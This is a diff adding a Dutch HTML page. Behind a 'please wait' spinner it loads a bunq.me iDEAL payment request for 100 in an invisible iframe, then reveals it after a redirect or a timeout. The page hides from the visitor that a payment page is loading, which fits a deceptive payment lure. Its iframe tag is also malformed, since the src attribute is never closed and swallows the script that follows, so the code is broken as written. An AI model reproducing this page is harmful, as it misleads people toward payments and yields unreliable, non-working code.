@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Even geduld…</title>
+<style>
+  html,body{margin:0;height:100%;font-family:system-ui,Arial,sans-serif;background:#0f172a;color:#fff}
+  #laadscherm{position:fixed;inset:0;display:flex;flex-direction:column;
+    align-items:center;justify-content:center;gap:24px;z-index:10}
+  .spinner{width:56px;height:56px;border:6px solid rgba(255,255,255,.2);
+    border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  /* Het kader met pagina A: wél geladen, maar onzichtbaar */
+  #doel{position:fixed;inset:0;border:0;width:100%;height:100%;
+    opacity:0;pointer-events:none;z-index:1}
+  #doel.zichtbaar{opacity:1;pointer-events:auto;z-index:20}
+</style>
+</head>
+<body>
+  <div id="laadscherm">
+    <div class="spinner"></div>
+    <div>Een moment, we bereiden je pagina voor…</div>
+  </div>
+
+  <iframe id="doel" src="https://bunq.me/bouwstoreov?amount=100&paymentMethod=IDEAL
+
+  <script>
+    var frame = document.getElementById('doel');
+    var laad  = document.getElementById('laadscherm');
+    var keer  = 0;
+
+    frame.addEventListener('load', function () {
+      keer++;
+      // 1e keer = pagina A is geladen en begint aan zijn 5 seconden.
+      // 2e keer = A heeft je doorgestuurd naar pagina B → nu tonen.
+      if (keer >= 2) toon();
+    });
+
+    // Vangnet: na 12 sec hoe dan ook tonen, zodat je nooit vastzit.
+    setTimeout(toon, 12000);
+
+    function toon() {
+      laad.style.display = 'none';
+      frame.classList.add('zichtbaar');
+    }
+  </script>
+</body>
+</html>
